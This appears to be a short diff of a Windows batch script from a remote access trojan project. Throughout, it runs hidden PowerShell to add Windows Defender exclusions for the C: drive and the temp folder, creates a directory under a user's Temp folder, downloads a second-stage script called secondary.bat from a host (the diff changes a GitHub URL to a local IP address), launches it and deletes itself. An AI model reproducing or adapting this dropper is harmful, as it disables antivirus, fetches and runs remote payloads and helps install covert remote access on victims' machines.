@@ -27,7 +27,7 @@ powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath C:
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
 cd C:\Users\saif\AppData\Local\Temp\MicroWindows
 mkdir Logs
-powershell -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
+powershell -windowstyle hidden curl http://192.168.1.9:9000/secondary.bat -o secondary.bat
 start "" secondary.bat
 del "%~f0"
 
